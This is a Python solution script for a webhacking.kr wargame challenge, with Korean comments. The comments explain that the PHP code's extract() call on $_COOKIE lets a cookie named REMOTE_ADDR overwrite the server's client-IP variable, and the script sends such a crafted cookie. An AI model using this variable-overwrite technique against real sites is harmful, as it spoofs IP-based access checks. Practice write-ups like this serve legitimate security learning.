from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/bonus-4"
URI = "/"
PHPSESSID = 'jl43tngbl1sca1cumqkf3dhm57'
ANS = '112277...00...00...1'

COOKIES = {
    'PHPSESSID' : PHPSESSID,
    'REMOTE_ADDR' : ANS
}

# 풀이
# 1. extract 함수의 역할에 대해 확인해보면 매개변수 안에 있는 배열속 키들을 변수화해준다는 것을 
#    알수 있으며, 이를 통해 REMOTE_ADDR 변수를 extract 함수로 변조하면 된다고 추측할 수 있다.
# 2. 문제의 소스코드를 확인해보면 $_SERVER 변수 내용을 extract 함수로 실행한 다음에 $_COOKIE 변수에
#    동일한 작업을 수행한다는 것을 알 수 있다.
# 3. 2번의 정보를 바탕으로 $_COOKIE 변수 안에 $REMOTE_ADDR 변수를 변조하도록 쿠키 정보를 제작한 다음
#    링크를 호출하면 정답이다.

resp = requests.get(URL + URI, cookies=COOKIES)

print(resp.text)